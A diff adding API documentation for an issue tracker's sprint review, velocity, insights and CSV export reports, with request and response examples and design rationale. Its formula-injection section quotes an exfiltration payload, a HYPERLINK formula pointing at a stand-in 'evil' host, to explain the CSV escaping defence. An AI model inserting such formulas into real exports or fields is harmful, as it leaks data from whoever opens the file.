+        "points": 5, "closedAt": "2026-08-17T14:47:03Z", "deleted": false }
+    ]
+  },
+  "addedAfterStart":  { "count": 5, "points": 13,   "unestimatedCount": 1, "issues": [] },
+  "removedBeforeEnd": { "count": 3, "points": null, "unestimatedCount": 3, "issues": [] },
+  "completed":        { "count": 18, "points": 41,  "unestimatedCount": 4, "issues": [] },
+  "carriedOver": {
+    "count": 7, "points": 19, "unestimatedCount": 2,
+    "issues": [
+      { "issueId": null, "key": "DEMO-77", "title": null,
+        "typeId": null, "assigneeId": null, "statusId": null,
+        "points": 3, "closedAt": null, "deleted": true }
+    ]
+  },
+  "totals": {
+    "committedCount": 23, "committedPoints": 60,
+    "atEndCount": 25, "atEndPoints": 60,
+    "completedCount": 18, "completedPoints": 41,
+    "addedAfterStartCount": 5
+  },
+  "meta": {
+    "computedAt": "2026-08-20T09:14:22Z", "basedOnIssues": 28,
+    "truncated": false, "cap": 20000,
+    "firstIssueAt": "2024-11-04T08:31:00Z", "unmatchedFilters": []
+  }
+}
+```
+
+**Subject resolution is the burn-up's, exactly**: `sprintId` defaults to the project's ACTIVE sprint, no ACTIVE sprint is a `200` with `sprint: null` and five empty lists, a sprint that never started answers the same way with `sprint` populated, and a `sprintId` that does not resolve inside this project is a `404` — a subject, never a filter. There is **no `measure` parameter**: this report reports counts *and* points for every list, so there is nothing to toggle.
+
+**Points here are the ledger's entry SNAPSHOT, the opposite of the burn-up beside it, and on purpose.** Every point value in this response is what the issue weighed **when it entered this sprint**, never today's estimate — see the burn-up's section above for the full statement of the pair. The consequence worth relying on: **every number in this response is stable for a COMPLETED sprint.** The ledger is append-only and id-keyed, so the record survives renames, survives re-estimates, and survives the deletion of the issues themselves.
+
+**The sprint's end is when it was COMPLETED, not when it was planned to end.** Every "before the end" boundary in this record is `completedAt` for a finished sprint and the instant of the request for a running one; `endAt` is reported beside them and decides nothing. A sprint completed three days late did not remove anything "after the end" for those three days, and one completed early did not carry over the work it had already stopped doing.
+
+**The five lists are labelled views, not a partition.** An issue is in `committed` and — if it landed — in `completed` too; that overlap is the whole point of the retro's headline. Only `committed` + `addedAfterStart` are disjoint and together cover everything the sprint ever held; only `completed` + `carriedOver` partition what it held at its end.
+
+- **`committed`** — what was in the sprint when it started: the commitment batch the start wrote, one `ADDED` per member stamped exactly `startAt`.
+- **`addedAfterStart`** — what joined afterwards. The number that makes a missed sprint legible.
+- **`removedBeforeEnd`** — what someone pulled *off* the sprint while it was running. **Distinct from `carriedOver`**, which is work the sprint ran out of time for. The two are separated without any timestamp comparison: a completion stamps `completedAt` in the update that arbitrates it and only *then* writes the ledger rows for the issues it moves out, so at that instant those issues are still members.
+- **`completed`** — in the sprint at its end and closed by then. **Identical in membership to the last point of the burn-up's completed line**, on purpose: two reports over one ledger that disagreed about what "done in this sprint" means would discredit both.
+- **`carriedOver`** — in the sprint at its end and not closed. For a finished sprint that is exactly what the completion moved to the backlog or the next sprint; for a running one it is what is still open right now.
+
+**The headline's denominator is `atEndCount`, not the commitment.** *"Completed 18 of 25"* reads `completedCount` of `atEndCount` — completed plus carried over, i.e. what the sprint **held at its end** — so the numerator is a subset of its own denominator and the ratio cannot exceed one. Against the *commitment* it can: work added after the start can be completed, so counting completions against what was committed compares two different populations, and a sprint that took late work on and finished it reported *"completed 25 of 23"*. The commitment is not lost by that — it keeps its own list, its own count and its own point sum beside the outcome, and `addedAfterStartCount` is precisely the clause that turns *"we missed the plan"* into *"the plan changed"*.
+
+**A `null` point sum means "no estimates here" and is not a zero.** `points` on a list — and `committedPoints` / `atEndPoints` / `completedPoints` on the totals — is `null` when **nothing** in that population carried an estimate, **empty lists included**. A list of six unestimated issues summing to `0` is indistinguishable on the wire from six issues estimated at zero, and a `0` reads as a measurement where a `null` reads as an absence. It is structural rather than something you re-derive: without it every client would have to infer emptiness from `count > unestimatedCount` in each of the five places a list is rendered. `unestimatedCount` is stated **per list** for the same reason — "committed 55 points" means something quite different when six of the twenty-three issues were never estimated.
+
+**A deleted issue still gets a row**, rendered from the ledger's snapshot: `deleted: true`, its `key` and its entry `points`, and `null` for `issueId`, `title`, `typeId`, `assigneeId`, `statusId` and `closedAt` — everything only the live issue could answer. **Render it as the line it is — "DEMO-77 (deleted)" — rather than as a broken link, and never drop it**, because dropping it would silently change what the sprint delivered.
+
+**A deleted issue out of a COMPLETED sprint always lands in `carriedOver`, with a null `closedAt`.** Completion lives on the issue, the issue is gone, and removing an issue from a frozen sprint writes no ledger row — so nothing in the record could prove it was finished. It is neither dropped (which would shrink what the sprint committed to) nor claimed as completed (which a report may not do for something it cannot show). The row's `deleted: true` and null completion are how you can see that the line is a shadow rather than a verdict.
+
+**Rows keep the order they first entered the sprint** — chronological for `addedAfterStart`, deterministic for the rest, and never dependent on a key's lexicographic accident (`DEMO-10` sorts before `DEMO-9`).
+
+**No per-assignee anything.** `assigneeId` is a field on a row so you can show an avatar; nothing in this feature groups, counts, sums or filters by it, and nothing may. And as everywhere on this path, **no capability changes any status code** — this report answers for any sprint that exists, in any project, whatever its `board` or `estimation` setting.
+
+### Velocity — how much should we plan for next sprint
+
+`GET …/reports/velocity` is the planning end of the set: the last N **completed** sprints as bars, each showing what it delivered with its commitment marked on it, and beside them a p50/p85 band to plan the next sprint with. The whole response is one sentence with a picture — *"Recent sprints delivered between 14 and 23 issues; plan for ~18 (p50) and treat 23 (p85) as a stretch. Based on 6 sprints."*
+
+```bash
+curl -s "$BASE/workspaces/$WS/projects/$PROJ/reports/velocity?sprints=6" \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+```json
+{
+  "measure": "COUNT",
+  "sprints": [
+    { "sprintId": "0192cc…", "name": "Sprint 6",
+      "startAt": "2026-05-01T09:00:00Z", "completedAt": "2026-05-15T16:02:41Z",
+      "committed": 19, "completed": 14, "addedAfterStart": 2, "carriedOver": 5,
+      "unestimatedCount": 0 },
+    { "sprintId": "0192d1…", "name": "Sprint 7",
+      "startAt": "2026-05-15T16:10:00Z", "completedAt": "2026-05-29T15:44:09Z",
+      "committed": 21, "completed": 18, "addedAfterStart": 4, "carriedOver": 3,
+      "unestimatedCount": 2 }
+  ],
+  "forecast": { "p50": 18.0, "p85": 23.0, "sampleSize": 6 },
+  "meta": {
+    "computedAt": "2026-08-20T09:14:22Z", "basedOnIssues": 142,
+    "truncated": false, "cap": 20000,
+    "firstIssueAt": "2024-11-04T08:31:00Z", "unmatchedFilters": []
+  }
+}
+```
+
+**This is the report the [family's three refusals](#how-every-report-behaves) were written for, and it is where they bite hardest.** Velocity's documented harm is not its arithmetic, it is its audience: a single number read as a productivity score, compared between teams, and answered by inflating estimates. So the three are not merely absent here, they are enforced — and an integrator who reads them as gaps will ask for the wrong thing:
+
+- **No per-person breakdown.** Not a filter, not a field, not a tooltip extra, not a future CSV column, and it will not be added. The statement behind this endpoint does not select an actor or an assignee column at all, so the refusal holds a layer below the response shape — there is nothing here to break down *by*.
+- **No cross-project or workspace-level aggregate, and the endpoint's own path is the enforcement.** This shape exists only under `/projects/{pId}/`; there is no workspace rollup and there must not be one. Comparing two teams means opening two pages and doing the arithmetic by hand, and **that friction is the design** — the cost of the comparison is paid by the person about to make it, because the harm above comes from comparisons cheap enough to make without thinking about them. An aggregate added "for convenience" deletes the mitigation and keeps the metric.
+- **No single quotable average.** There is no `averageVelocity` field and there is not meant to be one. What you get is a range that always arrives with its own sample size, precisely so there is nothing to paste into a status report.
+
+**`sprints` is refused at both ends, never clamped.** It defaults to `6` — roughly a quarter of a year — and anything below `1` or above `12` is a `400` whose `detail` names the bound and the value you asked for:
+
+```json
+{ "status": 400,
+  "detail": "sprints must be between 1 and 12 (asked for 24). The sample is not clamped for you: a forecast built from a different number of sprints than the one you asked for is worse than no forecast. 12 is about half a year, and a band computed from further back describes a team that has since changed its members, its process and its definition of a point." }
+```
+
+The lower bound is not pedantry: `sprints=0` would otherwise fail deeper in as a `500` on an endpoint whose contract promises a `400`, and *"zero sprints"* is a question with no answer rather than a request for an empty chart. And the cap of 12 is deliberately an order of magnitude below Jira's (120 sprints / 25 000 issues, raisable by a REST call) — not only for cost, but because **a band computed from further back is a precise number about a team that no longer exists**: different members, a different process, a different idea of what a point is.
+
+**The two kinds of `400` are ordered differently against tenancy, and you can see the difference.** A value that fails to *bind* — `sprints=x`, an unknown `measure`, a malformed path UUID — is refused by the framework before the handler runs, so it `400`s even for a project you cannot see. A value that binds and is *then* judged — `sprints=99` — is refused only after tenancy is resolved, so on a project you cannot see it is a `404`, because a `400` there would confirm the project exists.
+
+**There is no `sprintId`, and no `404` of its own.** The sample is resolved *from the project* — its most recently completed sprints — so no caller-supplied sprint id ever reaches the query. That is the subject-versus-filter rule from the other side: velocity's subject is the **project**, which the path already names, so there is nothing here that could fail to resolve.
+
+**The four numbers on a bar all share the requested measure.** Under `POINTS` all four are point sums; under `COUNT` all four are issue counts. A tooltip mixing "41 points delivered" with "4 issues added" would carry two units with no way for a reader to tell which is which.
+
+- `committed` — what was in the sprint at `startAt`. Marked **on** the bar rather than drawn as a second bar beside it: it is the plan, and the plan is context for the outcome, not a competing outcome.
+- `completed` — what was still in the sprint at `completedAt` and closed by then. **The bar's height, and the only number the band is computed from.**
+- `addedAfterStart` — everything that entered after `startAt`. The clause that turns *"we missed the plan"* into *"the plan changed"*: without it, a bar below its own commitment marker reads as a failure whatever actually happened. With `committed` it partitions everything the sprint ever held.
+- `carriedOver` — still in the sprint at `completedAt` and not closed. With `completed` it partitions what the sprint **held at its end**, which is the denominator the [sprint review](#sprint-review--committed-added-removed-completed-carried-over)'s headline uses — never `committed`, which counts a different population.
+
+Every boundary here is `completedAt`, never the planned end date, exactly as on the sprint review.
+
+**`unestimatedCount` is per sprint and is reported under both measures, and it is what keeps the chart honest.** It counts how many of the issues the sprint **held at its end** (the `completed` + `carriedOver` population) carried no estimate. Under `POINTS` an unestimated issue contributes `0` to the bar, so a sprint where nine of twenty-three issues were never estimated is a silent zero nine times over — **the bar and the band derived from it are quietly biased low**, with nothing else in the response to notice. Under `COUNT` it is the same disclosure a reader needs before flipping the toggle. Surface it.
+
+**Points are the ledger's entry snapshot, not current estimates** — the sprint review's rule, and the opposite of the burn-up's. See [the table under "How every report behaves"](#how-every-report-behaves) for all three in one place. The short version: velocity is retrospective and every sprint it describes is frozen, so with current points a re-estimate today would move a bar drawn four months ago *and the band computed from it*, and tomorrow's plan would change because somebody tidied yesterday's backlog. It also keeps the bar and its drill-down consistent — `committed` here is summed from the same snapshots the sprint review sums, so the review is literally the bar's breakdown.
+
+**The band is a p50/p85 with a sample size, and it is suppressed for two different reasons — which are not the same news.** `forecast` is **always present**; when it is suppressed both percentiles are `null` while `sampleSize` still states what there was, so a client says what it has rather than showing an empty box. Read `forecast.p50 === null` — suppression is a fact about the data, not a change of response shape. **The bars still render either way**: they are facts, and only the band is an inference.
+
+- **Fewer than three completed sprints** — *"Not enough completed sprints to forecast (need 3, have 2)"*. Three is the smallest sample in which a p50 and a p85 can name different sprints at all; at two, the "band" would be the range itself dressed up as a statistic. Same principle as `/cycle-time`'s percentile suppression, one level up — and **time fixes it**.
+- **`meta.truncated` is true** — the row cap bit, so the bars that survived are no longer the sample anybody asked for, and a p85 over a subset the reader did not choose is a number this report may not stand behind. **Time does not fix this one**; it is a bound being hit. See the truncation note below.
+
+**Read `meta.truncated` to tell the two apart.** A client that treats null percentiles as only ever meaning "not enough history yet" will explain the second case to its user wrongly.
+
+A project that has **never completed a sprint** is a `200` with an empty `sprints` list and `sampleSize: 0` — never a `404`, and never an error.
+
+**The band is fractional even under `COUNT`.** Percentiles use PostgreSQL's `percentile_cont` definition — the same one `/cycle-time` uses, so a "p85" means one thing across this product — which interpolates between the two sprints straddling the rank. So a six-sprint sample can legitimately answer `p50: 18.5` while every bar is a whole number. Percentiles are also never a rolling average and never a mean: one washed-out sprint would drag a mean somewhere no sprint ever was, and a forecast naming an outcome the team has never had is the "these numbers don't match what I expected" failure the `meta` block exists to prevent.
+
+**`sprints[]` is chronological, oldest first**, so you render left to right in time without sorting, and every bar carries `startAt` and `completedAt` so order never has to be inferred from a name.
+
+**When `meta.truncated` is true, `sprints[]` can be substantially shorter than the count you asked for — read it as "bars are missing", not as a quiet quarter.** Once the row cap has bitten, **every** sampled sprint with no shipped ledger rows is dropped, not merely one that was cut in half.
+
+The reason whole sprints go rather than a shaved tail is worth knowing, because it is also why the band is withheld. The sweep reads the ledgers ordered by sprint id, and those ids are **UUID v7 — time-ordered** — so a cap that bites removes the later-created sampled sprints' rows *entirely*. An absent sprint is then indistinguishable from the perfectly legitimate "nobody ever put anything in this sprint", and read as that it would be drawn as a bar of four zeros — **and those zeros would enter the forecast as real samples**, dragging p50 and p85 toward zero. A truncated report would quietly understate the team's output with `meta.truncated` as the only hint, while still drawing a band somebody would go on to quote. So the conservative reading wins: a sprint that really was empty vanishes from a truncated report, which is much the cheaper error.
+
+The bars that do ship are each complete, so they render; `forecast` is suppressed; `meta.truncated` says the cap bit; and `meta.basedOnIssues` — counted in the database above the cap — still states how many issues the report was about, so you can see how much is missing. Twelve sprints of hundreds of events against a cap of 20 000 makes this unreachable on real data; it is handled anyway, because "unreachable" is a property of today's data.
+
+`meta.basedOnIssues` here is the distinct issues the sampled sprints' ledgers hold, **counted in the database above the cap** and counted **once** for an issue that appeared in two of the sampled sprints. `meta.firstIssueAt` is the family's — the project's earliest issue, never the sample's — because scoping it to the sampled sprints would report a five-year-old project as having six sprints of history and fire a thin-data warning on exactly the projects with the most of it.
+
+**No capability changes any status code.** A `KANBAN` project answers with whatever sprints it has completed, and `measure=POINTS` answers with points in a project whose `estimation` is `false`.
+
+### Insights — break down the query in the search box
+
+`POST …/search/insights` is the dashboard replacement, and the seventh and last report of the set. Instead of a grid of independently-configured widgets, **one panel whose dataset is the HQL query already in the search box**: `slice` picks the x axis, `segment` optionally colours it, and the answer describes the same population the result list underneath is showing.
+
+That one-dataset design is the whole argument for it. There is nothing to double-count across widgets, no layout to migrate, and a [saved filter](#saved-filters) becomes a saved report at no cost — the panel cannot disagree with the list beneath it, because both compile from one query through one predicate.
+
+**It is the odd one out in this family in three ways, each deliberate**: it is a `POST`, it is **workspace-scoped** (so it lives on the search base path, not under `/projects/{pId}/reports`), and **its refusals are `422`, not `400`**. Each is explained below, because each is a place a client generalising from the other six will get it wrong.
+
+```bash
+curl -s -X POST "$BASE/workspaces/$WS/search/insights" \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"query":"status IN (\"In Progress\",\"In Review\")","slice":"ASSIGNEE","segment":"PRIORITY","measure":"COUNT"}'
+```
+
+```json
+{
+  "measure": "COUNT",
+  "slice": "ASSIGNEE",
+  "segment": "PRIORITY",
+  "slices": [
+    { "bucket": { "id": "0192c4…", "label": "Dana Reyes", "hql": "assignee = \"dana@acme.io\"" },
+      "count": 14, "points": 31, "unestimatedCount": 3 },
+    { "bucket": { "id": null, "label": null, "hql": "assignee IS EMPTY" },
+      "count": 6, "points": 8, "unestimatedCount": 4 }
+  ],
+  "segments": [
+    { "id": "0192b8…", "label": "High", "hql": "priority = \"High\"" },
+    { "id": "0192b9…", "label": "Medium", "hql": "priority = \"Medium\"" }
+  ],
+  "cells": [
+    { "sliceId": "0192c4…", "segmentId": "0192b8…", "count": 9, "points": 21, "unestimatedCount": 1 },
+    { "sliceId": "0192c4…", "segmentId": "0192b9…", "count": 5, "points": 10, "unestimatedCount": 2 },
+    { "sliceId": null, "segmentId": "0192b9…", "count": 6, "points": 8, "unestimatedCount": 4 }
+  ],
+  "sliceMultiValued": false,
+  "segmentMultiValued": false,
+  "slicesTruncated": false,
+  "cellsTruncated": false,
+  "sliceCap": 200,
+  "cellCap": 1000,
+  "meta": {
+    "computedAt": "2026-08-20T09:14:22Z", "basedOnIssues": 20,
+    "truncated": false, "cap": 20000,
+    "firstIssueAt": null, "unmatchedFilters": []
+  }
+}
+```
+
+**Every field of the body is optional**, so `{}` is a valid request meaning *"count everything I can see, grouped by status"*. `query` is the **same HQL string [`POST …/search`](#search-hql) takes** — parsed, validated, resolved and compiled by the same machinery, which is what guarantees the panel and the list cannot disagree — and empty means every issue you can see, exactly as on search. `measure` defaults to `COUNT`, `slice` to `STATUS`, and a blank `segment` means unsegmented. All three tokens are case-insensitive.
+
+**It is a `POST`, and that changes what caching means — do not expect the browser to help.** The query is a body (up to 2 000 characters), not a query string. **A `POST` response is not served from an HTTP cache**: browsers do not cache them, and RFC 9111's narrow allowance requires a `Content-Location` header no client here sends. So the `Cache-Control: private, max-age=60` and `Vary: Authorization` this endpoint carries are for **consistency and defence**, not for effect — they match the rest of the reports surface, and they mean that if an intermediary ever cached this anyway the response is already marked private and keyed on the credential. **The real 60-second de-duplication is client-side**, in your own query cache, which is where it has to be for a `POST`.
+
+**It spends two throttle budgets, not one, and the lower configured value binds** — past either, the answer is `429` with a `Retry-After` header (seconds), a retryable throttle rather than a fault. The panel sits under `…/search/**`, so it draws on the [search budget](#search-hql), and because it is a report it is *also* bound explicitly to the [reports budget](#how-every-report-behaves). Both are spent per request. It sits on the reports limiter deliberately, because removing that binding would raise the panel’s allowance to the search budget as a side effect — so do not assume which of the two governs: that follows from whatever an operator has configured, and lowering *either* property lowers the panel. **A panel refresh therefore competes with report fetches *and* with searches** — size your retries against the lower of the two.
+
+**Its refusals are `422` naming the parameter, not `400`.** This diverges from the five `/reports` endpoints on purpose. There, `?measure=BOGUS` is a *binding* failure Spring raises before the handler runs, so it is a `400` whose detail is generic. Here the parameters arrive inside a JSON body and are resolved in the service, so an unknown `measure`, `slice` or `segment` is a **`422` that names the parameter and lists what it accepts** — which is also what every other refusal under `/search` looks like. A client that generalises the reports family's `400` will handle the wrong code. Four things are `422`:
+
+- an **unparseable query** — `errorType: "PARSE_ERROR"` with a highlight span (`position`, `length`, nullable `token`);
+- a **semantic query error** — `errorType: "SEMANTIC_ERROR"` with the offending `field` and `position`. Byte-for-byte what `POST …/search` returns for the same query, because it is the same pipeline;
+- an **unknown `measure` / `slice` / `segment`**;
+- **`segment` equal to `slice`** — a diagonal is not a breakdown, and it is refused rather than rendered, because the response would look like a broken chart with nothing in it to explain why.
+
+The only `400`s are binding-level: a malformed body, a `query` over 2 000 characters, a `measure` / `slice` / `segment` over **32** characters, or a path id that is not a UUID. Note where the line falls on those three tokens: an **oversized** one is rejected at binding, before it is ever looked at, so it is a `400` — while an **unrecognised** one reaches the resolver and is the `422` above. A missing workspace and a non-member are the same `404`, never a `403`.
+
+**`measure` ranks; it does not filter.** Every bucket always carries `count`, `points` **and** `unestimatedCount`, whatever you asked for — they fall out of one `GROUP BY` and cost nothing measurable, so flipping your own toggle needs no round trip. What the measure decides is the `ORDER BY`, and therefore **which buckets survive the caps**: a response is the top `sliceCap` buckets *by that measure*, so **`POINTS` can return a different set of bars than `COUNT` over the identical query**. That is correct rather than surprising — "the ten statuses with the most issues" and "the ten with the most points" are different questions, and a truncated top-N has to know which one it was asked. `NONE` means "no y axis, draw a table"; server-side it ranks by count (a bucket must be ordered by *something* to be capped at all) and it is echoed back so you know not to draw bars.
+
+**A bar's height is not the sum of its stacks, and you must not compute it that way.** Bars and cells are capped **separately** — `sliceCap` (200) and `cellCap` (1000), both fixed constants rather than operator settings — and the bars get their own `GROUP BY`. So **`slices[].count` and `points` are always exact**, even when the breakdown under them is partial. Summing the cells to get a bar would make every truncated response quietly understate its own chart.
+
+**Two truncation flags, two different pictures, and a client should be able to say which happened.**
+
+- `slicesTruncated` — **bars are missing from the x axis**. There were more buckets than `sliceCap`, and what you got is the largest by `measure`.
+- `cellsTruncated` — **the breakdown inside the bars is partial**. Either there were more cells than `cellCap`, or a cell belonged to a bar that did not survive `sliceCap` (a stack belonging to no bar is unrenderable, so it is dropped and this flag is set). The bars themselves are still exact.
+
+Note what does **not** happen: `meta.truncated` stays `false` and `meta.cap` keeps meaning `app.reports.max-rows`. That is a fact rather than a stub — this report materialises **no issue rows at all** (PostgreSQL aggregates and returns buckets), so the row cap cannot bite, the same thing [`/flow`](#flow--created-vs-resolved) reports for the same reason. What can truncate here is buckets, and that is what the two flags above are for.
+
+**`meta.basedOnIssues` is deliberately not the sum of the series.** It is the distinct issues matching your query — **the same number the search result list shows** — computed independently of every cap. With a many-valued dimension the bars sum to **more** than it (one issue with three labels lands in three buckets); when a cap bites they sum to **less**. Neither is a defect, and `sliceMultiValued` / `segmentMultiValued` are on the response precisely so you can label the total honestly rather than leaving the reader to discover the mismatch. Today `LABEL` is the only many-valued dimension.
+
+**Buckets are keyed by id, not by name, and you will see the consequence.** Each visible project owns its own statuses, types, priorities, components and sprints, so two projects can both have an "In Progress": two catalog rows, **two buckets, one label**, and the panel shows both. Grouping by name was rejected because it fails more quietly — a name that no longer resolves would produce a bar whose own filter fragment `422`s the moment somebody clicked it. `cells` reference buckets **by id**, and `null` is a **real id** (the no-value bucket), so match it as one rather than treating it as missing.
+
+**`bucket.label` is `null` for the no-value bucket** — unassigned, no component, no labels, not in a sprint. "Unassigned" / "No component" / "Backlog" is UI copy, and the server deliberately does not send it; supply your own.
+
+**`bucket.hql` is the click-through fragment, and where it is `null` the bar is not safely clickable.** It selects **exactly** the issues in that bucket, for the click-to-narrow affordance — the panel is a navigation device as much as a chart. **Do not rebuild it client-side.** It looks trivial and it is not: the rule behind every `null` is *the fragment reproduces this bucket exactly, or there is no fragment*, and a locally-built clause breaks that silently by producing valid-looking HQL over the wrong set. It is `null` in four cases:
+
+- the dimension has **no HQL vocabulary at all** — `PROJECT`, see below;
+- the bucket's name **does not resolve**: a **completed sprint**, an **archived** component or label. HQL drops those from name resolution on purpose, so a fragment naming one would `422` the moment it was clicked;
+- the name resolves to **more than one id** — the cross-project "In Progress" above. The fragment would be strictly **wider than the bar**, and a filter returning more issues than the bar you clicked is exactly the "these numbers don't match" failure this epic is organised around;
+- on `ASSIGNEE` only, when the member has no email. The fragment addresses people by email because that is unique within a workspace; a display name is not, and would silently widen to every match.
+
+**`PROJECT` is a slice with no click-through.** Issues carry a project and your search scope already restricts which are visible, so the grouping is perfectly good — but HQL has no `project` field yet, so **every project bucket ships `hql: null`**. The slice works; the drill-down does not. That is a known gap with its own ticket, not a bug.
+
+**`ASSIGNEE` is offered here and refused by [velocity](#velocity--how-much-should-we-plan-for-next-sprint), and that is not an inconsistency.** Velocity is a *published metric* — stable URL, quoted in a ceremony — where a per-person column becomes a comparison whether anyone meant it or not. This is an *ad-hoc query somebody typed*: its dataset is whatever HQL is in the box, it is not addressable as "the team's number", and the same person could get the same breakdown by running eight searches and writing the totals down. The line is **published metric vs. ad-hoc query**.
+
+**Capability narrows what is offered, never what resolves.** [`GET /search/schema`](#search-hql) carries an `insights` block listing the measures and dimensions worth putting in front of this caller: `SPRINT` appears only when at least one visible project has `board: SCRUM`, and `POINTS` only when at least one has `estimation` on — mirroring how the `sprint` and `storyPoints` *fields* are narrowed. **A dimension omitted there still resolves if you ask for it**, exactly as an omitted field still parses. No status code depends on a capability, so a saved panel state cannot break because a curator flipped a project toggle.
+
+### CSV exports — the chart as a file
+
+Every one of the six project reports has a `.csv` sibling: append `.csv` to the path. It takes **the same parameters** as its JSON twin, answers **the same status codes**, and returns `200 text/csv; charset=UTF-8` with `Content-Disposition: attachment`.
+
+| Method | Path | Auth | Rows |
+|---|---|---|---|
+| `GET` | `…/reports/flow.csv?from=&to=&interval=&typeId=&componentId=&labelId=` | member | One per bucket |
+| `GET` | `…/reports/cycle-time.csv?from=&to=&typeId=&componentId=&labelId=` | member | One per plotted point (= one per completed issue) |
+| `GET` | `…/reports/aging.csv` | member | One per open issue, carrying its column |
+| `GET` | `…/reports/sprint-burnup.csv?sprintId=&measure=` | member | One per UTC day |
+| `GET` | `…/reports/sprint-review.csv?sprintId=` | member | One per issue **per list** |
+| `GET` | `…/reports/velocity.csv?sprints=&measure=` | member | One per completed sprint |
+
+**What you get is the plotted series — one row per data point — not a list of issues.** That is the whole feature. Where an export like this exists at all it usually hands back a flat issue list, which is the documented disappointment: people ask for the chart, get a spreadsheet of issues, and go back to screenshotting. Every row in these files is a point that was drawn, and every point that was drawn is a row.
+
+`cycle-time.csv` and `aging.csv` look like the exception and are not: their charts are scatter plots **of issues**, so one dot is one issue, and `key` and `title` are there to identify the dot you are pointing at. Neither carries a description, a status history or a component list — the columns an issue export would have and a chart does not plot.
+
+**There is no "matching issues" export in this API, and you should not read these files as one.** The "download matching issues" button is a different feature, and the search-side export path it needs **does not exist yet** — there is no CSV or export endpoint under `/search`, and it cannot be assembled client-side either: HQL has no `project` field to scope the handoff with, and no `resolved`/`closed` field, so the flow report's *resolved* half is not expressible as a query at all. It is filed as its own ticket. Until it lands, a report CSV is the numbers that were drawn and nothing else.
+
+#### The comment header is part of the contract
+
+Above the rows sits a `#`-comment block. It is what makes an exported file still say what it is after it has been mailed on, renamed and opened three weeks later — treat it as contract, not decoration. **Every line in the file is CSV cells — the header lines and the column row included** — so one reader parses the whole thing.
+
+```
+<BOM>"# Hamstrack report: velocity"
+"# Project: DEMO - Demo Project"
+"# Project id: 0192a0…"
+"# Measure: COUNT"
+"# Window: 6 completed sprints"
+"# Forecast: p50=18, p85=23, sample size=6 - a range to plan the next sprint with, and deliberately not a single number to compare teams by"
+"# Computed at: 2026-08-20T09:14:22Z"
+"# Based on issues: 142"
+"# Truncated: no (row cap 20000)"
+"sprintId","name","startAt","completedAt","committed","completed","addedAfterStart","carriedOver","unestimatedCount"
+0192cc…,"Sprint 6",2026-05-01T09:00Z,2026-05-15T16:02:41Z,19,14,2,5,0
+```
+
+It carries the report name, the project key + name + id, the window, the measure / sprint / interval **where the report has one**, the percentiles **or the reason they were suppressed**, `computedAt`, `basedOnIssues`, and whether truncation bit.
+
+**A parser must not require a fixed header block.** Only the lines that apply are emitted — **most reports have no measure at all** (only the burn-up and velocity take one), `aging` states that it *has* no window rather than printing an empty one, and the suppression, truncation, unmatched-filter and no-sprint lines appear only when they are true. Match on the `# key: value` shape, never on position or count — and **unquote the line first: each header line is one quoted CSV cell**, `#` included.
+
+That quoting is a security control rather than tidiness. A comment line emitted raw is still split on commas, so only its *first* cell begins with `#`: a project or sprint name containing a comma ends that cell and opens a new one, which is free to begin with `=`. Neither name restricts commas or equals signs, so wrapping the whole line in quotes is what closes the breakout. The column row is quoted for the same reason.
+
+**If you already parse these files, this is the one behaviour change to know about.** Because `#` now sits *inside* the quotes, a reader configured to drop comment lines by a leading `#` — `pandas.read_csv(..., comment="#")` and its equivalents — **no longer skips the header**, and sees one-column rows instead. The trade was taken deliberately: there is no format in which a line both starts with a bare `#` and is a single cell. Either match the header and read it (which is what the rest of this section tells you to do anyway), or drop lines whose first cell starts with `#` *after* unquoting — but do not filter on a bare leading `#`.
+
+Every honesty rule the JSON carries travels with the numbers, because an export is a new surface rather than a serialisation format: a suppressed percentile pair or velocity band is suppressed here too **with the reason in the header** rather than left as an empty column to be read as zero; `cycleDays` is empty where no start was recorded and is never backfilled from `created_at`; a truncated series says so instead of silently shipping fewer rows; a filter that matched nothing is named, so a thin file is never mistaken for a quiet quarter.
+
+#### Six things you cannot guess from the JSON
+
+1. **Not every report has a measure**, and the header emits only the lines that apply — hence the rule above about not requiring a fixed block.
+2. **`sprint-review.csv` is not a plotted series at all**, because the report is not a chart. It is five labelled lists, so the file is one row per issue **per list**, with a leading `list` column. **The same key legitimately appears more than once** — an issue that was committed and then completed is in both lists — exactly as on screen. Summing a column across the whole file double-counts.
+3. **The burn-up's scope-change log is deliberately not folded in.** Two tables in one CSV is a file no spreadsheet opens correctly. The header counts the changes and points at the JSON endpoint, so you are told what is missing rather than left to notice.
+4. **A missing subject is a `200`, not an error.** "No ACTIVE sprint" is a `200` in JSON, so the file is a `200` whose header carries a `# No sprint:` note and which has zero data rows. An unexplained empty CSV would recreate exactly the ambiguity the JSON avoids.
+5. **`null` is an empty, unquoted field** — never `""`, never `null`. Report gaps are real (a cycle time with no start, a suppressed band, a sprint with no completion date), and an empty field is what every spreadsheet and dataframe library reads back as *missing*.
+6. **UTF-8 BOM, CRLF line endings.** Both are deliberate. Without the BOM, Excel on Windows decodes the file as the system code page and mangles every non-ASCII title; the cost is three bytes a strict RFC 4180 parser will see on the first line, and Excel, LibreOffice, Sheets, `pandas` (`encoding="utf-8-sig"`) and R all strip it.
+
+#### Formula injection: text cells are guarded, numbers are not
+
+Text cells are **always quoted** (inner quotes doubled), and a text cell whose first character is `=`, `+`, `-`, `@`, tab or CR is **prefixed with an apostrophe**. Without that, an issue titled `=HYPERLINK("https://evil/"&A1,"Q3 plan")` becomes a live exfiltration link the moment a colleague opens the file, and quoting does not help — the CSV parser strips quotes before the formula engine sees the value. **Expect that leading apostrophe when parsing text columns**, and strip it if you are re-importing.
+
+**Numeric, date, enum, UUID and boolean cells are deliberately not guarded.** A negative `net` or a negative scope `delta` legitimately begins with `-`, and prefixing it would turn the column into text that will not sum — which is the "these numbers don't match" failure this whole area is built to avoid. Those cells are server-generated from typed values and cannot carry attacker input.
+
+**The comment header is quoted for the same reason, and that is a recent fix.** A header line emitted raw is still split on commas, so only its first cell begins with `#`; a project or sprint name containing a comma ends that cell and opens a new one that is free to begin with `=`. Neither name restricts commas or equals signs, so the whole line — `#` included — is now one quoted cell, as is the column row. See the parser note above for what that changes for `comment="#"` readers.
+
+#### Filenames, caching and content negotiation
+
+The filename is **built by the server**, never taken from the client: `<PROJECT KEY>-<report>-<YYYY-MM-DD>.csv`, e.g. `DEMO-velocity-2026-08-20.csv`. Its date is the same `computedAt` the header prints, so the name and the contents can never disagree — which is how two exports of the same report are told apart in a downloads folder.
+
